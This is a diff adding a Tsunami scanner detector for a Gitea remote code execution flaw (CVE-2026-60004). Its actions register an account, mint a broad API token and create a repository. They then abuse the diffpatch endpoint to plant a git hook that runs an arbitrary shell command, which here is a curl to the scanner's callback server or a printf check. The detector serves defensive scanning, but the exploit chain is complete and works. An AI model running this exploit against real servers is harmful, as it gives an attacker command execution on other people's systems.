@@ -1,0 +1,300 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Gitea_CVE_2026_60004"
+  author: "Robert Dick (robert@doyensec.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2026-60004"
+  }
+  severity: CRITICAL
+  title: "RCE in Gitea via diffpatch Git Hook Installation (CVE-2026-60004)"
+  description: "Gitea allows RCE via the diffpatch endpoint. On default installations where user registration is possible, this is effectively unauthenticated RCE. This detector only works when user registration is enabled. Also note that cleanup will fail if the user is the first user on the instance, due to the admin user not being deletable."
+  recommendation: "Update the version to 1.27.1 or later. If possible, harden the instance by disabling user registration and limiting the network service exposure. "
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-60004"
+  }
+}
+
+config: { debug: True }
+
+###########
+# ACTIONS #
+###########
+
+# We have to read the cookie from this request, otherwise the registration response
+# will contain two values, and we can't tell which one we need for the next requests.
+
+actions: {
+  name: "fingerprint_gitea"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Gitea:" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "i_like_gitea=([a-zA-Z0-9_]+);"
+            variable_name: "SESSION_COOKIE1"
+          }
+        ]
+      }
+    }
+  }
+}
+
+# Using additional checks here such as the flash message cookie resulted in test cases failing
+# Probably a limitation of the templated engine with duplicate header values.
+
+actions: {
+  name: "register_user"
+  http_request: {
+    method: POST
+    uri: "/user/sign_up"
+    data: "user_name=tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}&email=tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}@localhost&password=tsunami-insecure-{{ T_UTL_CURRENT_TIMESTAMP_MS }}&retype=tsunami-insecure-{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded"},
+      { name: "Cookie" value: "i_like_gitea={{ SESSION_COOKIE1 }}; lang=en-US" }
+    ]
+    response: {
+      http_status: 303
+      extract_all: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "i_like_gitea=([a-zA-Z0-9_]+);"
+            variable_name: "SESSION_COOKIE2"
+          }
+        ]
+      }
+    }
+  }
+  cleanup_actions: ["delete_user"]
+}
+
+
+actions: {
+  name: "delete_user"
+  http_request: {
+    method: POST
+    uri: "/user/settings/account/delete"
+    headers: [
+      { name: "Cookie" value: "i_like_gitea={{ SESSION_COOKIE2 }}; lang=en-US" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded"}
+    ]
+    data: "password=tsunami-insecure-{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+actions: {
+  name: "create_api_key"
+  http_request: {
+    method: POST
+    uri: "/user/settings/applications"
+    headers: [
+      { name: "Cookie" value: "i_like_gitea={{ SESSION_COOKIE2 }}; lang=en-US" },
+      { name: "Content-Type" value: "application/x-www-form-urlencoded"}
+    ]
+    data: "name=tsunamitoken&scope-public-only=&scope-activitypub=write%3Aactivitypub&scope-issue=write%3Aissue&scope-misc=write%3Amisc&scope-notification=write%3Anotification&scope-organization=write%3Aorganization&scope-package=write%3Apackage&scope-repository=write%3Arepository&scope-user=write%3Auser"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 303
+      extract_all: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "info%3D([a-zA-Z0-9_]+)%26"
+            variable_name: "API_KEY"
+          }
+        ]
+      }
+    }
+  }
+}
+
+# we use two cleanup actions here, since if we don't, the delete user runs first which fails
+# due to having repositories in the account still.
+
+actions: {
+  name: "register_repo"
+  http_request: {
+    method: POST
+    uri: "/api/v1/user/repos"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ API_KEY }}" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\": \"tsunami-test-{{ T_UTL_CURRENT_TIMESTAMP_MS }}\", \"private\": true, \"auto_init\": true, \"default_branch\": \"main\", \"object_format_name\": \"sha1\"}"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 201
+    }
+  }
+  cleanup_actions: ["delete_repo", "delete_user"]
+}
+
+actions: {
+  name: "delete_repo"
+  http_request: {
+    method: DELETE
+    uri: "/api/v1/repos/tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}/tsunami-test-{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ API_KEY }}" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 204
+    }
+  }
+}
+
+# very complicated step, the hash/blob_oid needs to match the content of the payload,
+# so it can't be changed easily. Sensitive to number of lines, hash of content, and length of content.
+# we skip checking the response code since we know the repo was already created and this one sometimes
+# returns 201 and sometimes returns 500.
+
+actions: {
+  name: "execute_command"
+  http_request: {
+    method: POST
+    uri: "/api/v1/repos/tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}/tsunami-test-{{ T_UTL_CURRENT_TIMESTAMP_MS }}/diffpatch"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ API_KEY }}" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    data:
+        '{"content":"'
+        "diff --git a/hooks/post-index-change b/hooks/post-index-change\\n"
+        "new file mode 100755\\n"
+        "index 0000000000000000000000000000000000000000..8deab400022c6525b0da136f9dadc0fa8def75bb\\n"
+        "--- /dev/null\\n"
+        "+++ b/hooks/post-index-change\\n"
+        '@@ -0,0 +1,14 @@'
+        '+#!/bin/sh\\n'
+        '+git_dir=$(git rev-parse --absolute-git-dir) || exit 1\\n'
+        '+origin_objects=$(sed -n \\"1p\\" \\"$git_dir/objects/info/alternates\\") || exit 2\\n'
+        '+case \\"$origin_objects\\" in\\n'
+        '+  /*) ;;\\n'
+        '+  *) origin_objects=\\"$git_dir/objects/$origin_objects\\" ;;\\n'
+        '+esac\\n'
+        '+origin_git=${origin_objects%/objects}\\n'
+        '+[ \\"$origin_git\\" != \\"$origin_objects\\" ] || exit 3\\n'
+        '+output_blob=$( /bin/sh -c \\"{{ PAYLOAD }}\\" 2>&1 | git --git-dir=\\"$origin_git\\" hash-object -w --stdin) || exit 4\\n'
+        '+tree=$(printf \\"100644 blob %s\\\\\\\\tREADME.md\\\\\\\\n\\" \\"$output_blob\\" | git --git-dir=\\"$origin_git\\" mktree) || exit 5\\n'
+        '+commit=$(printf \\"command output:\\" | GIT_AUTHOR_NAME=poc GIT_AUTHOR_EMAIL=poc@example.invalid GIT_COMMITTER_NAME=poc GIT_COMMITTER_EMAIL=poc@example.invalid git --git-dir=\\"$origin_git\\" commit-tree \\"$tree\\") || exit 6\\n'
+        '+git --git-dir=\\"$origin_git\\" update-ref refs/heads/main \\"$commit\\" || exit 7\\n'
+        '+exit 0\\n'
+        '\\u005c No newline at end of file'
+        '",'
+        '"message": "rce poc",'
+        '"branch": "main", "new_branch": "main"}'
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+# Since our payload needs to have a fixed length, we can't do out of band verification.
+# The callback server URL length might vary depending on the hostname used.
+
+actions: {
+  name: "check_result"
+  http_request: {
+    method: GET
+    uri: "/api/v1/repos/tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}/tsunami-test-{{ T_UTL_CURRENT_TIMESTAMP_MS }}/raw/README.md"
+    headers: [
+      { name: "Authorization" value: "Bearer {{ API_KEY }}" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ COMMAND_OUTPUT }}" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  variables: [
+    { name: "PAYLOAD" value: "curl {{ T_CBS_URI }}"}
+  ]
+  actions: [
+    "fingerprint_gitea",
+    "register_user",
+    "create_api_key",
+    "register_repo",
+    "execute_command",
+    "execute_command",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  variables: [
+    { name: "PAYLOAD" value: "printf %x 133713371337" },
+    { name: "COMMAND_OUTPUT" value: "1f21f020c9" }
+  ]
+  
+  actions: [
+    "fingerprint_gitea",
+    "register_user",
+    "create_api_key",
+    "register_repo",
+    "execute_command",
+    "execute_command",
+    "sleep",
+    "check_result"
+  ]
+}
